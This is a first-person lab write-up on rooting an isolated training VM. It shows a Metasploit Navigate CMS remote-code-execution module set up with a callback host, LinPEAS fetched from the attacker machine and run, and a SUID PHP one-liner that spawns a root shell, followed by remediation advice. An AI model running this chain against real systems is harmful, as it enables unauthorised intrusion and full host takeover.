LAB WRITEUP · LINUX

Blackpearl

I investigated exposed web functionality and local privilege boundaries on Blackpearl, an isolated Linux training VM.

This writeup documents an isolated, offline training lab. Actual credentials and unrelated personal data are excluded.

Target environment

  • Target: Blackpearl
  • Operating system: Linux
  • Architecture: x86_64 (64-bit)
  • Service / application: Nginx 1.14.2; Navigate CMS 2.8
  • Weakness investigated: Navigate CMS remote code execution; root-owned SUID PHP interpreter
  • Scope: Intentionally vulnerable, isolated training VM

1. DNS enumeration and hostname resolution

I used DNSRecon to enumerate the target and identify blackpearl.tcm. My notes did not preserve the exact DNSRecon command or the returned records, so the command below is representative rather than terminal history.

dnsrecon -d blackpearl.tcm

I mapped the hostname to the target in /etc/hosts on Kali and on my Mac, then verified resolution with getent. My notes record this entry and output:

sudo nano /etc/hosts
# added:
192.168.18.10 blackpearl.tcm

getent hosts blackpearl.tcm
192.168.18.10 blackpearl.tcm

I checked HTTP connectivity with curl. The server responded with HTTP 200 OK and identified itself as Nginx 1.14.2.

curl -I http://blackpearl.tcm
HTTP/1.1 200 OK
Server: nginx/1.14.2
Content-Type: text/html; charset=UTF-8

2. Web content discovery

I used FFUF with the medium DirBuster wordlist to discover exposed web content.

ffuf -u http://blackpearl.tcm/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Numerous requests returned identical responses (status 200, 652 bytes, 82 words, 27 lines), which I treated as a repeated baseline rather than real content. One result differed:

secret [Status: 200, Size: 209, Words: 31, Lines: 9]

I reran FFUF with -fs 652 to filter the baseline size and -s for silent output. A different response was a lead to inspect, not proof of a useful endpoint.

ffuf -u http://blackpearl.tcm/FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 652 -s

Further enumeration discovered /navigate, which exposed Navigate CMS 2.8. That became my target for initial access; /secret was a separate result and was not the access vector.

3. Vulnerability research

I identified a Metasploit module for Navigate CMS 2.8 that chains authentication bypass with path traversal in the upload handler. Together, these weaknesses allow an unauthenticated attacker to place and execute PHP code remotely.

I selected the module and configured the target, virtual host and callback. The capture below shows the LHOST, RHOST and VHOST settings. TARGETURI is reconstructed from the /navigate discovery and is not visible in the capture.

msfconsole
search navigate_cms
use exploit/multi/http/navigate_cms_rce
show options
set LHOST 192.168.18.4
set RHOST 192.168.18.10
set VHOST blackpearl.tcm
set TARGETURI /navigate/
exploit

4. Initial access

I executed the exploit and obtained a shell through the vulnerable CMS. I ran whoami and confirmed that the session operated as www-data.

This established remote command execution under the web service account, but I still needed to identify a local privilege escalation path.

5. Shell stabilization and local enumeration

The initial shell had limited terminal functionality. Python was available, so I used its pty module to spawn an interactive Bash shell.

python -c 'import pty; pty.spawn("/bin/bash")'

I inspected my user identity, group memberships, sudo permissions and shell history. These checks did not reveal a useful escalation path, so I continued with broader local enumeration.

whoami
id
sudo -l
history

6. LinPEAS enumeration

I hosted LinPEAS, a Linux privilege escalation enumeration script, from Kali using Python’s HTTP server on port 80.

python3 -m http.server 80

On Blackpearl, I downloaded the script to /tmp, made it executable and ran it. The server log above confirms the download; the exact download command was not captured, so wget below is representative.

cd /tmp
wget http://192.168.18.4/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

I reviewed the results for SUID/SGID executables, writable paths, privileged processes, scheduled tasks and configuration weaknesses. The enumeration identified PHP 7.3 as a potential privilege escalation vector.

7. SUID PHP investigation

I enumerated SUID (set user ID) binaries—executables that run with their owner’s effective privileges—and inspected /usr/bin/php7.3.

find / -type f -perm -4000 2>/dev/null
ls -l /usr/bin/php7.3

I identified the root-owned PHP interpreter as an executable that could run with elevated effective privileges. The permission listing itself was not captured.

I consulted GTFOBins and identified a technique using PHP’s pcntl_exec() function to launch a shell while retaining those privileges.

8. Privilege escalation

My first attempt failed because of incorrect shell syntax:

bash: syntax error near unexpected token ')'

I corrected the quoting and executed:

/usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'

This was a permissions problem, not a PHP vulnerability: a general-purpose interpreter had been granted root privileges. pcntl_exec() replaced the PHP process with /bin/sh, and the -p option preserved the elevated effective privileges inherited from the SUID interpreter.

I ran whoami in the resulting shell and received root, confirming successful privilege escalation.

www-data@blackpearl:/tmp$ /usr/bin/php7.3 -r 'pcntl_exec("/bin/sh", ["-p"]);'
# whoami
root

My notes record that the original low-privileged UID remained visible. That is expected when the real UID stays www-data while the effective UID is root; the full id output was not preserved.

Result and evidence limits

Result: Root access achieved

I compromised Blackpearl by exploiting Navigate CMS 2.8, obtaining a www-data shell, and escalating privileges through a root-owned PHP interpreter with SUID (set user ID) permissions.

I completed the attack chain from web application exploitation to root access. The lab demonstrated how a vulnerable CMS and an unnecessarily privileged interpreter could be chained to compromise the entire host.

The selected captures show module configuration, the www-data shell, local commands, the PHP escalation and the final root identity. DNS/web enumeration results, the SUID permission listing and full LinPEAS findings are recorded in my notes but are not present in the selected screenshots. Commands marked as representative or reconstructed above were not preserved as exact terminal history. Recommended fixes were not retested.

9. Findings and remediation

Attack / finding

Navigate CMS remote code execution

I exploited the vulnerable CMS to execute commands as www-data. This exposed the application’s files and resources accessible to its service account and provided a foothold for further compromise.

Recommended defensive action

Recommended fixes include upgrading or replacing the vulnerable CMS, restricting unnecessary application functionality, and limiting service account permissions.

Attack / finding

SUID PHP privilege escalation

I used the privileged PHP interpreter to escalate from www-data to a root shell. Combined with the CMS vulnerability, this enabled full host compromise.

Recommended defensive action

Recommended fixes include removing unnecessary SUID permissions from interpreter binaries, auditing privileged executable ownership and permissions, and enforcing least privilege.
